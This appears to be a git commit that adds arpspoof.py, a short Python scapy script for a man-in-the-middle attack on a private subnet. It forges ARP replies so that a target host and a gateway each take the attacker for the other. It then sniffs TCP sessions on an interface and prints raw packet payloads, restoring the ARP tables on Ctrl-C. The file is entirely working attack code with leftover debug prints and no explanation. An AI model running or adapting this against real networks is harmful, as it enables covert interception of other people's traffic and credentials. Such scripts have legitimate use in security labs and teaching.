8ea861ba872b9ae24f009a3c1209ef8a7bae0605
Burak <81985143+burakkutlu@users.noreply.github.com>
2023-07-20 10:06:12 +0300

    Add files via upload

---
+++ arpspoof.py
@@ -0,0 +1,44 @@
+from scapy.all import *
+import scapy.all as scapy
+import time
+
+interval = 4
+ip_target = "192.168.33.30"
+ip_gateway = "192.168.33.20"
+
+def spoof(target_ip, spoof_ip):
+    macAddr = scapy.getmacbyip(target_ip)
+    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = macAddr, psrc = spoof_ip)
+    scapy.send(packet, verbose = False)
+   
+def restore(destination_ip, source_ip):
+    destination_mac = scapy.getmacbyip(destination_ip)
+    source_mac = scapy.getmacbyip(source_ip)
+    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
+    scapy.send(packet, verbose = False)
+
+try:
+    while True:
+        spoof(ip_target, ip_gateway)
+        spoof(ip_gateway, ip_target)
+        print("capture'a geldim")
+
+        capture = sniff(session=TCPSession, iface = "eth1")
+        skip = False
+        for x in capture:
+            skip = not skip
+            if skip == 1:
+                continue
+
+            if Raw in x:
+                print("asdasdasdasdas")
+                load = x[Raw].load
+                print("load: ", load)
+
+        print("sniff bitti")
+        #capture.show()
+
+        time.sleep(interval)
+except KeyboardInterrupt:
+    restore(ip_gateway, ip_target)
+    restore(ip_target, ip_gateway)
